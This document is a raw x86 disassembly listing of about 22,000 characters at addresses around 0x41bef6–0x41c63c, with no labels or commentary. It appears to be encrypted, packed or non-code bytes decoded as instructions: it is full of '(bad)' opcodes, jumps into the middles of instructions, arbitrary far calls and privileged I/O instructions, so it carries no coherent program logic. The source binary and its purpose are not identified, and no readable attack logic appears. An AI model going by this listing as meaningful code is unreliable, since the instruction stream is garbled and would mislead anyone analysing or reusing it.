  41bef6:	jecxz  0x41be7a
  41bef8:	adc    esi,DWORD PTR [ebp+esi*8-0x46264437]
  41beff:	loopne 0x41bf34
  41bf01:	mov    ebp,0xb20c4f1c
  41bf06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf07:	add    ebx,DWORD PTR [eax+ebp*8]
  41bf0a:	xor    BYTE PTR [esp+eax*1+0x38],dl
  41bf0e:	aam    0xd5
  41bf10:	mov    bh,bl
  41bf12:	fiadd  WORD PTR [edi-0x6b3496f2]
  41bf18:	rcr    BYTE PTR [ebx],0x94
  41bf1b:	cwde   
  41bf1c:	repnz push es
  41bf1e:	sub    edx,DWORD PTR [ebx-0x43]
  41bf21:	test   eax,0xadeef3fe
  41bf26:	cs pusha 
  41bf28:	popa   
  41bf29:	fist   WORD PTR [eax+0x3dfe4f3f]
  41bf2f:	fcom   DWORD PTR [eax-0x52]
  41bf32:	or     al,0x83
  41bf34:	cmp    ch,BYTE PTR [eax]
  41bf36:	xchg   edi,eax
  41bf37:	add    ah,BYTE PTR ds:0xdeec9347
  41bf3d:	dec    edi
  41bf3e:	inc    edx
  41bf3f:	adc    al,0xad
  41bf41:	call   0xf8eedd66
  41bf46:	ror    DWORD PTR [edx-0x62a14650],1
  41bf4c:	idiv   BYTE PTR [edi+0x79]
  41bf4f:	dec    eax
  41bf50:	repnz jecxz 0x41bef3
  41bf53:	in     al,0x68
  41bf55:	pop    ebp
  41bf56:	fsin   
  41bf58:	and    eax,0x79711e89
  41bf5d:	div    DWORD PTR [ecx]
  41bf5f:	sbb    edx,eax
  41bf61:	jae    0x41bfd9
  41bf63:	pop    edx
  41bf64:	dec    ebp
  41bf65:	rol    DWORD PTR [edx+ecx*4-0xb37742],1
  41bf6c:	and    cl,BYTE PTR [ecx-0x26157d26]
  41bf72:	stos   DWORD PTR es:[edi],eax
  41bf73:	scas   al,BYTE PTR es:[edi]
  41bf74:	xchg   esp,eax
  41bf75:	jmp    0x41bf34
  41bf77:	or     eax,DWORD PTR [esi]
  41bf79:	jnp    0x41bf74
  41bf7b:	loope  0x41bf7e
  41bf7d:	mov    DWORD PTR [eax-0x3],edi
  41bf80:	(bad)  
  41bf81:	out    0xa4,eax
  41bf83:	shl    DWORD PTR [ecx],0x5e
  41bf86:	stos   BYTE PTR es:[edi],al
  41bf87:	xchg   edi,eax
  41bf88:	xchg   BYTE PTR [ebx+0x6694762a],al
  41bf8e:	xor    BYTE PTR [edx],0xdb
  41bf91:	pop    ebp
  41bf92:	dec    ecx
  41bf93:	jns    0x41bfdc
  41bf95:	popa   
  41bf96:	ret    
  41bf97:	jbe    0x41bf45
  41bf99:	add    al,BYTE PTR [edi+0x4a]
  41bf9c:	xor    eax,esi
  41bf9e:	sub    eax,ecx
  41bfa0:	and    ebx,DWORD PTR [ebx-0x40]
  41bfa3:	mov    al,BYTE PTR [ecx+0x28]
  41bfa6:	js     0x41c011
  41bfa8:	add    eax,0x21194e4d
  41bfad:	jmp    0x41bfa8
  41bfaf:	mov    ebx,0xab5b0444
  41bfb4:	lahf   
  41bfb5:	sub    eax,0xa4722357
  41bfba:	and    edi,esp
  41bfbc:	dec    edx
  41bfbd:	mov    esp,0xdd4e71c8
  41bfc2:	pop    eax
  41bfc3:	cmp    esp,esi
  41bfc5:	or     edi,DWORD PTR [esi-0xa]
  41bfc8:	(bad)  
  41bfc9:	cmp    ecx,DWORD PTR [edi-0x2b]
  41bfcc:	cmp    ch,bh
  41bfce:	jecxz  0x41bfef
  41bfd0:	(bad)  
  41bfd1:	in     al,0x39
  41bfd3:	inc    ecx
  41bfd4:	mov    eax,ds:0x5865018f
  41bfd9:	js     0x41bff3
  41bfdb:	in     eax,0xec
  41bfdd:	lock pop eax
  41bfdf:	ret    
  41bfe0:	push   esi
  41bfe1:	(bad)
  41bfe4:	dec    ebx
  41bfe5:	scas   al,BYTE PTR es:[edi]
  41bfe6:	aam    0xe6
  41bfe8:	ret    0x99ce
  41bfeb:	mov    edi,0x97f3cc6b
  41bff0:	add    DWORD PTR [eax-0x79],ecx
  41bff3:	loope  0x41bfb5
  41bff5:	and    eax,0xc33228c1
  41bffa:	pop    ds
  41bffb:	cmp    al,0xbf
  41bffd:	inc    esp
  41bffe:	lods   eax,DWORD PTR ds:[esi]
  41bfff:	(bad)  
  41c000:	scas   al,BYTE PTR es:[edi]
  41c001:	rcl    BYTE PTR [edx],0x9e
  41c004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c005:	data16 bnd jae 0x41bfb4
  41c009:	scas   al,BYTE PTR es:[edi]
  41c00a:	cmp    DWORD PTR [ebx+0x37],esp
  41c00d:	mov    BYTE PTR [ecx-0x21d0521f],al
  41c013:	je     0x41bff8
  41c015:	out    0xef,al
  41c017:	scas   al,BYTE PTR es:[edi]
  41c018:	cs jmp 0x9945:0x672280e9
  41c020:	sub    DWORD PTR [edi],0xffffff8f
  41c023:	sbb    eax,0x7a59e19b
  41c028:	ins    DWORD PTR es:[edi],dx
  41c029:	jle    0x41c007
  41c02b:	sbb    eax,0xc3de56bb
  41c030:	pusha  
  41c031:	xchg   esp,eax
  41c032:	test   DWORD PTR [ebx+0x28],ebx
  41c035:	inc    edx
  41c036:	mov    dh,0xf5
  41c038:	scas   eax,DWORD PTR es:[edi]
  41c039:	push   ebx
  41c03a:	test   DWORD PTR [ecx],esi
  41c03c:	cs inc eax
  41c03e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c03f:	mov    al,0xd5
  41c041:	and    al,0xbb
  41c043:	mov    esp,0x5dabc86c
  41c048:	sub    al,0xf6
  41c04a:	leave  
  41c04b:	pop    ebp
  41c04c:	fnstenv [ebp+0xd910597]
  41c052:	leave  
  41c053:	call   0x977f7d0a
  41c058:	fs push ebx
  41c05a:	icebp  
  41c05b:	ins    DWORD PTR es:[edi],dx
  41c05c:	iret   
  41c05d:	mov    BYTE PTR [esi-0x6e],cl
  41c060:	inc    esi
  41c061:	add    ecx,DWORD PTR [esp+edi*4-0x7a]
  41c065:	(bad)  
  41c066:	mov    esp,0x91fb7f68
  41c06b:	inc    esp
  41c06c:	mov    es,WORD PTR [esi+0xf5414e9]
  41c072:	xor    eax,0x14338926
  41c077:	das    
  41c078:	ins    DWORD PTR es:[edi],dx
  41c079:	push   ebp
  41c07a:	push   cs
  41c07b:	out    dx,al
  41c07c:	das    
  41c07d:	rol    ebx,0x44
  41c080:	fiadd  WORD PTR [edx+0x26]
  41c083:	in     eax,0x3b
  41c085:	push   edx
  41c086:	cmp    ecx,ebp
  41c088:	push   ebx
  41c089:	jb     0x41c041
  41c08b:	aam    0x92
  41c08d:	aas    
  41c08e:	outs   dx,DWORD PTR ds:[esi]
  41c08f:	mov    dl,0x1f
  41c091:	sub    DWORD PTR [esp+esi*1+0x2d89a286],ebx
  41c098:	lock bound edi,QWORD PTR [ecx+0x3b8427fa]
  41c09f:	jge    0x41c11c
  41c0a1:	xchg   BYTE PTR [ebx+0x40],al
  41c0a4:	push   ebx
  41c0a5:	jnp    0x41c105
  41c0a7:	sbb    eax,0x6f9f26fe
  41c0ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0ad:	adc    BYTE PTR [eax-0x13],dh
  41c0b0:	xlat   BYTE PTR ds:[ebx]
  41c0b1:	lea    ebp,[eax-0x1747d1a3]
  41c0b7:	sbb    esi,DWORD PTR [ecx]
  41c0b9:	push   0x4e
  41c0bb:	fcom   DWORD PTR [edi-0x77]
  41c0be:	stc    
  41c0bf:	stos   DWORD PTR es:[edi],eax
  41c0c0:	fstp   QWORD PTR [ebx-0x5e]
  41c0c3:	test   eax,0x5d3f58da
  41c0c8:	lods   al,BYTE PTR ds:[esi]
  41c0c9:	sbb    cl,BYTE PTR [ebx+0x39d0ec42]
  41c0cf:	adc    ebx,esi
  41c0d1:	lods   al,BYTE PTR ds:[esi]
  41c0d2:	sub    ebx,eax
  41c0d4:	inc    esi
  41c0d5:	adc    eax,0x3ddc1f28
  41c0da:	scas   al,BYTE PTR es:[edi]
  41c0db:	cmp    DWORD PTR [ecx-0x52],ebp
  41c0de:	jno    0x41c119
  41c0e0:	or     al,0x4
  41c0e2:	or     BYTE PTR [edx-0x4504017d],dh
  41c0e8:	mov    ch,0xce
  41c0ea:	in     al,0x18
  41c0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ed:	and    BYTE PTR [esi+0x8],cl
  41c0f0:	sub    al,0x46
  41c0f2:	(bad)  
  41c0f4:	aad    0x29
  41c0f6:	ret    
  41c0f7:	nop
  41c0f8:	mov    esp,ecx
  41c0fa:	aad    0xaf
  41c0fc:	add    BYTE PTR ds:[ebx-0x433ae583],ch
  41c103:	fdivr  QWORD PTR ds:0xcae96954
  41c109:	cmc    
  41c10a:	jno    0x41c0a6
  41c10c:	das    
  41c10d:	retf   
  41c10e:	das    
  41c10f:	dec    eax
  41c110:	adc    ecx,edi
  41c112:	mov    cl,0x8
  41c114:	fdiv   QWORD PTR [ebp-0x7ecb96f8]
  41c11a:	stos   DWORD PTR es:[edi],eax
  41c11b:	lea    eax,[esi+eiz*2-0x79d86ac]
  41c122:	jecxz  0x41c16a
  41c124:	inc    edx
  41c125:	or     DWORD PTR [eax],esi
  41c127:	out    dx,al
  41c128:	xchg   BYTE PTR [eax+0xe54b1eb],ch
  41c12e:	into   
  41c12f:	or     BYTE PTR [edx-0x592bf0d5],0x9b
  41c136:	dec    esi
  41c137:	mov    eax,0x7760110e
  41c13c:	push   ebx
  41c13d:	mov    eax,ds:0x6021b325
  41c142:	jne    0x41c0c4
  41c144:	cmc    
  41c145:	and    cl,BYTE PTR [ecx]
  41c147:	pusha  
  41c148:	jo     0x41c0f0
  41c14a:	cmp    edx,esp
  41c14c:	dec    ebx
  41c14d:	jp     0x41c1c6
  41c14f:	mov    cl,0x41
  41c151:	xor    al,0x39
  41c153:	mov    ds:0x615c3dd4,eax
  41c158:	pop    ebp
  41c159:	in     al,dx
  41c15a:	xor    edx,ecx
  41c15c:	cli    
  41c15d:	mov    ebx,0xf0fd9499
  41c162:	(bad)
  41c166:	and    al,0x45
  41c168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c169:	(bad)  
  41c16a:	out    0xa3,eax
  41c16c:	stc    
  41c16d:	fs add dl,bh
  41c170:	or     eax,0x87cdd5d8
  41c175:	std    
  41c176:	(bad)  
  41c177:	xchg   esp,eax
  41c178:	popf   
  41c179:	pop    ds
  41c17a:	mov    DWORD PTR es:[ebx+0x40aa2919],ebp
  41c181:	pop    ebp
  41c182:	dec    eax
  41c183:	call   FWORD PTR [ebx+0x47]
  41c186:	push   0x4b
  41c188:	dec    eax
  41c189:	pop    edi
  41c18a:	dec    edx
  41c18b:	(bad)  
  41c18c:	mov    ds:0x1b2440a0,eax
  41c191:	jns    0x41c154
  41c193:	xor    DWORD PTR ds:0xf20d2aff,eax
  41c199:	popf   
  41c19a:	adc    BYTE PTR [ecx+edi*4-0x6a],cl
  41c19e:	mov    ds:0xd73a3597,al
  41c1a3:	stc    
  41c1a4:	(bad)  
  41c1a5:	mov    bh,0xf0
  41c1a7:	cmp    eax,0xcddcf93b
  41c1ac:	ds daa 
  41c1ae:	pop    es
  41c1af:	pop    esi
  41c1b0:	loope  0x41c20b
  41c1b2:	sub    ah,BYTE PTR [eax-0x42519e2e]
  41c1b8:	jle    0x41c186
  41c1ba:	popf   
  41c1bb:	arpl   WORD PTR [ecx+0x46],bp
  41c1be:	xor    al,0x1b
  41c1c0:	add    eax,0x6bdef521
  41c1c5:	jb     0x41c226
  41c1c7:	aad    0xe1
  41c1c9:	mov    ecx,0x8600465a
  41c1ce:	sub    al,0xe0
  41c1d0:	cmc    
  41c1d1:	fidiv  WORD PTR [ebx+0x12]
  41c1d4:	sub    cl,dh
  41c1d6:	dec    esp
  41c1d7:	inc    eax
  41c1d8:	or     dh,BYTE PTR [edi-0x43739a2b]
  41c1de:	out    0x4b,al
  41c1e0:	js     0x41c1ce
  41c1e2:	dec    ebp
  41c1e3:	aaa    
  41c1e4:	rcl    BYTE PTR [edi-0x2],0x43
  41c1e8:	jno    0x41c193
  41c1ea:	xchg   ebp,eax
  41c1eb:	inc    esp
  41c1ec:	out    dx,eax
  41c1ed:	cmp    al,0x1c
  41c1ef:	out    dx,al
  41c1f0:	jne    0x41c246
  41c1f2:	or     eax,0xdce548d4
  41c1f7:	lods   al,BYTE PTR ds:[esi]
  41c1f8:	push   ebx
  41c1f9:	ja     0x41c1ec
  41c1fb:	es inc ebx
  41c1fd:	out    0xcd,eax
  41c1ff:	xchg   ebx,eax
  41c200:	retf   
  41c201:	rcl    BYTE PTR [eax-0x71],0x97
  41c205:	inc    esp
  41c206:	jns    0x41c1e2
  41c208:	fisttp DWORD PTR [ebp+0x522065dd]
  41c20e:	push   ebp
  41c20f:	push   edi
  41c210:	cmp    BYTE PTR [ecx+0x1e7adf11],dh
  41c216:	bnd js 0x41c22c
  41c219:	push   ecx
  41c21a:	push   edx
  41c21b:	fld    TBYTE PTR ds:0xf79d361f
  41c221:	(bad)  
  41c222:	rcl    DWORD PTR [ebx+0x599c28a4],1
  41c228:	adc    al,0x28
  41c22a:	or     DWORD PTR [ecx+esi*8],esi
  41c22d:	lods   eax,DWORD PTR ds:[esi]
  41c22e:	aam    0x2a
  41c230:	and    edx,edi
  41c232:	add    DWORD PTR [esp+ebp*1-0xae89444],0xffffffd9
  41c23a:	and    eax,esi
  41c23c:	push   es
  41c23d:	mov    esi,gs
  41c23f:	cmp    edx,edi
  41c241:	mov    ds:0xd7e48603,al
  41c246:	jg     0x41c26f
  41c248:	daa    
  41c249:	cli    
  41c24a:	fsubp  st(5),st
  41c24c:	std    
  41c24d:	test   BYTE PTR [eax-0x74],dh
  41c250:	les    eax,FWORD PTR [edi+0x6a]
  41c253:	shl    DWORD PTR [eax+0x303efed2],cl
  41c259:	mov    esi,0xd79f84f6
  41c25e:	inc    eax
  41c25f:	add    edx,DWORD PTR [eax-0x13]
  41c262:	xchg   ebx,eax
  41c263:	push   es
  41c264:	jbe    0x41c1f9
  41c266:	popf   
  41c267:	in     eax,0x3b
  41c269:	mov    ah,0x85
  41c26b:	popa   
  41c26c:	(bad)  
  41c26d:	add    eax,0x7a38bc92
  41c272:	xchg   ebx,eax
  41c273:	xor    eax,0x81a9a236
  41c278:	jmp    0xc476455a
  41c27d:	inc    ebp
  41c27e:	dec    ebp
  41c27f:	fsub   DWORD PTR [edi+eax*1-0x50e1940f]
  41c286:	aad    0xeb
  41c288:	lds    esp,FWORD PTR [ebx+0xe]
  41c28b:	hlt    
  41c28c:	bnd ss ret 0x2642
  41c291:	scas   al,BYTE PTR es:[edi]
  41c292:	dec    edx
  41c293:	int3   
  41c294:	push   ebx
  41c295:	xor    edi,DWORD PTR [edi]
  41c297:	adc    BYTE PTR [eax],0x48
  41c29a:	aaa    
  41c29b:	ret    
  41c29c:	cld    
  41c29d:	test   DWORD PTR [eax-0x28],ecx
  41c2a0:	(bad)  
  41c2a1:	dec    edx
  41c2a2:	pop    esi
  41c2a3:	call   0x5867:0xfc42b864
  41c2aa:	push   ebp
  41c2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2ac:	cs dec ebp
  41c2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2af:	xchg   edx,eax
  41c2b0:	enter  0xa19f,0xad
  41c2b4:	cmp    al,0xec
  41c2b6:	or     al,0x4f
  41c2b8:	out    dx,eax
  41c2b9:	repnz xor BYTE PTR [eax-0x1e],cl
  41c2bd:	or     eax,0x6e3a1278
  41c2c2:	cmp    al,0xea
  41c2c4:	fcomp  DWORD PTR [ebp+0x53]
  41c2c7:	mov    DWORD PTR [ecx],edx
  41c2c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ca:	pop    eax
  41c2cb:	xchg   edi,eax
  41c2cc:	cmp    bl,BYTE PTR ds:0xdbc72a6
  41c2d2:	ror    BYTE PTR [edx],1
  41c2d4:	repnz enter 0xe3ff,0xe0
  41c2d9:	sub    al,0x9b
  41c2db:	xchg   edi,esp
  41c2dd:	lods   al,BYTE PTR ds:[esi]
  41c2de:	cli    
  41c2df:	arpl   WORD PTR [ecx-0x14c5edcf],si
  41c2e5:	(bad)  
  41c2e6:	ds cld 
  41c2e8:	popa   
  41c2e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ea:	and    al,0x18
  41c2ec:	mov    ds:0xaf2fb41e,al
  41c2f1:	ja     0x41c27b
  41c2f3:	pop    eax
  41c2f4:	fistp  QWORD PTR [ebp+0x47]
  41c2f7:	dec    ebx
  41c2f8:	pop    ecx
  41c2f9:	jne    0x41c2fd
  41c2fb:	call   0x2d0e:0xd7262cba
  41c302:	dec    eax
  41c303:	pushf  
  41c304:	pop    ss
  41c305:	ret    
  41c306:	repz mov edx,0xf9cc3532
  41c30c:	xor    eax,0xdb5036ef
  41c311:	les    eax,FWORD PTR [ecx+0x1]
  41c314:	arpl   WORD PTR [eiz*1-0x31551e76],bp
  41c31b:	pushf  
  41c31c:	(bad)  
  41c31d:	cdq    
  41c31e:	xor    DWORD PTR [ebx+0x399274d3],edi
  41c324:	sub    BYTE PTR [ebp-0x6b8a7ef8],bh
  41c32a:	loope  0x41c37b
  41c32c:	push   cs
  41c32d:	in     al,0x20
  41c32f:	push   ebx
  41c330:	std    
  41c331:	int    0xa8
  41c333:	jmp    0xf98f:0xffd2d59f
  41c33a:	call   DWORD PTR [edx]
  41c33c:	scas   eax,DWORD PTR es:[edi]
  41c33d:	(bad)
  41c340:	mov    ecx,0x8dd2709a
  41c345:	cmp    eax,0xe28421b2
  41c34a:	jle    0x41c35d
  41c34c:	xchg   edi,eax
  41c34d:	daa    
  41c34e:	pusha  
  41c34f:	loop   0x41c3c6
  41c351:	mov    WORD PTR [ebp-0x43eb4ca6],cs
  41c357:	cmp    ah,BYTE PTR [esp+edi*8+0xc2bed2e]
  41c35e:	mov    dh,0x20
  41c360:	xchg   ebp,eax
  41c361:	mov    edx,ds
  41c363:	mov    WORD PTR ds:0x50c9f5d4,?
  41c369:	ret    
  41c36a:	jecxz  0x41c32e
  41c36c:	push   ss
  41c36d:	enter  0x541,0xd0
  41c371:	add    eax,0x22f3a668
  41c376:	inc    edi
  41c377:	dec    esp
  41c378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c379:	jp     0x41c355
  41c37b:	jo     0x41c3a4
  41c37d:	mov    eax,ds:0xdfd4e601
  41c382:	sbb    ch,BYTE PTR [ecx+0x7f]
  41c385:	daa    
  41c386:	mul    DWORD PTR [esi+ebp*8-0x36]
  41c38a:	idiv   DWORD PTR [ebx+0x76]
  41c38d:	ret    0x9fe0
  41c390:	jo     0x41c34e
  41c392:	out    0x68,al
  41c394:	xchg   BYTE PTR [edi+edx*2+0x5a5922d9],dh
  41c39b:	cwde   
  41c39c:	xor    al,0x8
  41c39e:	(bad)  
  41c39f:	cmp    cl,BYTE PTR [eax-0x5abe18c7]
  41c3a5:	xchg   edx,eax
  41c3a6:	lds    ebx,FWORD PTR [ebp+0x65]
  41c3a9:	popa   
  41c3aa:	inc    edx
  41c3ab:	mov    bh,0x49
  41c3ad:	inc    ebp
  41c3ae:	aas    
  41c3af:	jmp    0x36bc:0xdc031942
  41c3b6:	sbb    BYTE PTR [esi+0x3a],bh
  41c3b9:	jmp    0x41c34a
  41c3bb:	popf   
  41c3bc:	fwait
  41c3bd:	popf   
  41c3be:	retf   
  41c3bf:	test   DWORD PTR ds:0x2e237281,eax
  41c3c5:	mov    bh,BYTE PTR [esi]
  41c3c7:	pop    edx
  41c3c8:	imul   edi,DWORD PTR [eax-0x45d47712],0xfd14cf8b
  41c3d2:	adc    al,0xbf
  41c3d4:	mov    al,0xfe
  41c3d6:	nop
  41c3d7:	cmc    
  41c3d8:	xchg   ebp,eax
  41c3d9:	in     al,dx
  41c3da:	and    al,BYTE PTR [eax-0x54]
  41c3dd:	cmp    DWORD PTR [ebx],0x13240366
  41c3e3:	nop
  41c3e4:	retf   0x566e
  41c3e7:	inc    eax
  41c3e8:	jb     0x41c405
  41c3ea:	sbb    BYTE PTR [esi-0x6f],ch
  41c3ed:	test   al,0x5d
  41c3ef:	sbb    edx,DWORD PTR [edx]
  41c3f1:	fistp  WORD PTR [ebx+0x47935855]
  41c3f7:	in     al,0x51
  41c3f9:	mov    ch,0x61
  41c3fb:	scas   eax,DWORD PTR es:[edi]
  41c3fc:	push   edi
  41c3fd:	fidiv  WORD PTR [ebp+0x66]
  41c400:	je     0x41c407
  41c402:	and    dh,BYTE PTR ds:0xae7a918e
  41c408:	lock es in al,dx
  41c40b:	scas   al,BYTE PTR es:[edi]
  41c40c:	xchg   BYTE PTR [esi],dh
  41c40e:	sbb    DWORD PTR [ebx],eax
  41c410:	dec    edi
  41c411:	fst    DWORD PTR [ebp-0x7a]
  41c414:	xchg   eax,ebp
  41c416:	dec    edx
  41c417:	sub    ecx,DWORD PTR [edi-0x77]
  41c41a:	popf   
  41c41b:	shr    BYTE PTR [edi-0x33],1
  41c41e:	sbb    BYTE PTR [edx-0x4cc6414e],0x7
  41c425:	pop    edx
  41c426:	in     al,dx
  41c427:	mov    edi,0xaf1d3e31
  41c42c:	push   0x76959873
  41c431:	jecxz  0x41c496
  41c433:	dec    edi
  41c434:	push   edi
  41c435:	and    BYTE PTR ds:0xc042aa30,dl
  41c43b:	ret    
  41c43c:	cs fdivrp st(4),st
  41c43f:	cmp    eax,0xeb910dc8
  41c444:	pop    es
  41c445:	xchg   edi,eax
  41c446:	retf   0x868d
  41c449:	add    ebp,DWORD PTR [eax+0x16dd4bf5]
  41c44f:	(bad)  
  41c450:	mov    edx,0x4cddb027
  41c455:	(bad)  
  41c456:	int3   
  41c457:	mov    al,ds:0x49374da6
  41c45c:	add    DWORD PTR [esi+0x21],edx
  41c45f:	mov    ch,0xad
  41c461:	cmp    ch,bh
  41c463:	mov    ds:0x296dd555,eax
  41c468:	xchg   edi,eax
  41c469:	pop    gs
  41c46b:	adc    edx,ebp
  41c46d:	sub    eax,0x79
  41c470:	jmp    0xe9091bc5
  41c475:	mov    dh,0xdd
  41c477:	sbb    eax,0xd744de6b
  41c47c:	test   ecx,ecx
  41c47e:	lahf   
  41c47f:	(bad)  
  41c480:	jb     0x41c47d
  41c482:	adc    al,0x52
  41c484:	push   cs
  41c485:	punpckldq mm5,mm5
  41c488:	das    
  41c489:	mov    ecx,0xe033bf0
  41c48e:	xor    eax,0x10b551a1
  41c493:	xchg   ecx,eax
  41c494:	pop    edi
  41c495:	pushf  
  41c496:	ins    DWORD PTR es:[edi],dx
  41c497:	mov    dh,0xe6
  41c499:	xor    DWORD PTR [ebx-0x2316807d],eax
  41c49f:	xor    esp,ebp
  41c4a1:	stc    
  41c4a2:	out    0x69,al
  41c4a4:	addr16 mov ebp,0xb5e99bfc
  41c4aa:	not    BYTE PTR [edx-0x2f]
  41c4ad:	pop    ds
  41c4ae:	xor    DWORD PTR [eax],edi
  41c4b0:	jl     0x41c529
  41c4b2:	pop    edx
  41c4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b4:	pop    edx
  41c4b5:	shl    DWORD PTR [edx],1
  41c4b7:	imul   eax,edx,0x5e4834fb
  41c4bd:	inc    ebp
  41c4be:	mov    ch,0x63
  41c4c0:	xchg   edi,eax
  41c4c1:	xlat   BYTE PTR ds:[ebx]
  41c4c2:	fwait
  41c4c3:	aam    0xe
  41c4c5:	jmp    0xad9c:0x1a2dfda7
  41c4cc:	push   ebp
  41c4cd:	sbb    edx,eax
  41c4cf:	ss push esi
  41c4d1:	mov    ds:0xf650c262,al
  41c4d6:	cs dec edi
  41c4d8:	retf   
  41c4d9:	xchg   ebp,esp
  41c4db:	mov    esp,0x930d0d9c
  41c4e0:	and    al,0xbc
  41c4e2:	shl    ecx,0xb3
  41c4e5:	xlat   BYTE PTR ds:[ebx]
  41c4e6:	inc    esi
  41c4e7:	cdq    
  41c4e8:	and    eax,0x68c7c7e9
  41c4ed:	clc    
  41c4ee:	setbe  bl
  41c4f1:	lods   al,BYTE PTR ds:[esi]
  41c4f2:	out    0x5b,eax
  41c4f4:	sbb    ch,BYTE PTR [ebx-0x52]
  41c4f7:	popf   
  41c4f8:	test   al,0x83
  41c4fa:	ret    0xed59
  41c4fd:	mov    ecx,0x1824080d
  41c502:	(bad)  
  41c504:	sub    eax,0x764ffc8f
  41c509:	sbb    DWORD PTR [ecx+0x2432cf36],edi
  41c50f:	and    DWORD PTR [eax],0xc149672a
  41c515:	hlt    
  41c516:	stos   DWORD PTR es:[edi],eax
  41c517:	mov    BYTE PTR [edi-0x73],al
  41c51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c51c:	into   
  41c51d:	mov    ebx,0xc4f1ba76
  41c522:	bound  edx,QWORD PTR [ecx]
  41c524:	mov    ah,0x1a
  41c526:	pop    ds
  41c527:	jo     0x41c56e
  41c529:	rcr    BYTE PTR [edx+0x54],0x80
  41c52d:	mov    cl,0x98
  41c52f:	cdq    
  41c530:	dec    edi
  41c531:	in     eax,dx
  41c532:	nop
  41c533:	add    ebx,eax
  41c535:	into   
  41c536:	sbb    eax,0xba3caf8b
  41c53b:	fnstcw WORD PTR [esi+0x15]
  41c53e:	cdq    
  41c53f:	aam    0xf9
  41c541:	shl    BYTE PTR [ecx],cl
  41c543:	ja     0x41c513
  41c545:	and    DWORD PTR [ebx-0x107d8248],eax
  41c54b:	ss or  ebp,eax
  41c54e:	pop    es
  41c54f:	ror    ch,0xe2
  41c552:	mov    al,ds:0x8423ccf8
  41c557:	ret    
  41c558:	cdq    
  41c559:	imul   bh
  41c55b:	push   0x11c5220b
  41c560:	xor    BYTE PTR [eax-0x71],0x95
  41c564:	sbb    cl,BYTE PTR [edx-0x4d]
  41c567:	outs   dx,BYTE PTR ds:[esi]
  41c568:	fcmovne st,st(2)
  41c56a:	lahf   
  41c56b:	jae    0x41c5b9
  41c56d:	mov    cl,0x9b
  41c56f:	call   FWORD PTR ds:0x9e9b2476
  41c575:	and    BYTE PTR [edx+0x1b],ah
  41c578:	in     al,dx
  41c579:	fsubr  QWORD PTR [esi]
  41c57b:	rsm    
  41c57d:	rol    edi,1
  41c57f:	inc    ecx
  41c580:	popf   
  41c581:	dec    eax
  41c582:	fbstp  TBYTE PTR [edi-0x7d]
  41c585:	xchg   BYTE PTR [ecx+0x2acf0631],dh
  41c58b:	sbb    dh,BYTE PTR [ebx+eiz*1]
  41c58e:	mov    BYTE PTR [edi-0x1a],ch
  41c591:	or     BYTE PTR [edx-0x433becf6],ah
  41c597:	jp     0x41c5d8
  41c599:	dec    esp
  41c59a:	cmove  ebp,DWORD PTR [edx]
  41c59d:	js     0x41c610
  41c59f:	shl    ecx,1
  41c5a1:	sahf   
  41c5a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5a3:	sbb    BYTE PTR [ecx+0x71d7c7d0],al
  41c5a9:	xchg   edi,eax
  41c5aa:	clc    
  41c5ab:	jo     0x41c54f
  41c5ad:	loopne 0x41c607
  41c5af:	jnp    0x41c5c5
  41c5b1:	(bad)  
  41c5b2:	ror    BYTE PTR [ecx],0xa6
  41c5b5:	ror    dl,0xed
  41c5b8:	xchg   edi,eax
  41c5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ba:	inc    ebp
  41c5bb:	lods   al,BYTE PTR ds:[esi]
  41c5bc:	das    
  41c5bd:	outs   dx,DWORD PTR ds:[esi]
  41c5be:	repz xchg esi,eax
  41c5c0:	xor    eax,0xf483f131
  41c5c5:	xchg   esi,eax
  41c5c6:	test   esi,esi
  41c5c8:	jmp    0x2bff:0x1e407c62
  41c5cf:	in     al,dx
  41c5d0:	cld    
  41c5d1:	jnp    0x41c60a
  41c5d3:	in     al,0x25
  41c5d5:	adc    DWORD PTR [ecx-0x4b66f101],eax
  41c5db:	imul   esi,DWORD PTR [ebx-0x61],0xfffffff9
  41c5df:	sub    ch,BYTE PTR [edi]
  41c5e1:	fdivr  QWORD PTR [ebx-0x13]
  41c5e4:	test   BYTE PTR [edi],bl
  41c5e6:	fsincos 
  41c5e8:	and    BYTE PTR [edx-0x35],al
  41c5eb:	pushf  
  41c5ec:	add    eax,0xcd40543c
  41c5f1:	loopne 0x41c5a2
  41c5f3:	sub    BYTE PTR [ebp+0x76],dl
  41c5f6:	pusha  
  41c5f7:	jp     0x41c587
  41c5f9:	cmp    al,0x93
  41c5fb:	clc    
  41c5fc:	jne    0x41c60a
  41c5fe:	out    0x89,eax
  41c600:	repnz movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41c603:	pop    esp
  41c604:	das    
  41c605:	xchg   edi,eax
  41c606:	rcr    DWORD PTR [ecx],0x3f
  41c609:	cmp    al,0xd2
  41c60b:	ficomp DWORD PTR [ebx+esi*1]
  41c60e:	jo     0x41c5a3
  41c610:	sub    esp,esp
  41c612:	push   ss
  41c613:	sub    edi,DWORD PTR [edx]
  41c615:	(bad)  
  41c616:	xor    al,0xf9
  41c618:	jno    0x41c5ac
  41c61a:	or     eax,0xf2fe8f23
  41c61f:	mov    bl,0x46
  41c621:	and    DWORD PTR [ebp-0x35],0xc1e5af04
  41c628:	add    DWORD PTR ss:[esi+ebp*8],edi
  41c62c:	mov    al,0xae
  41c62e:	jae    0x41c67d
  41c630:	pop    edx
  41c631:	jmp    0x3de:0xf1f6e132
  41c638:	xor    BYTE PTR [ecx+0x1e],0xb3
  41c63c:	pop    ebp
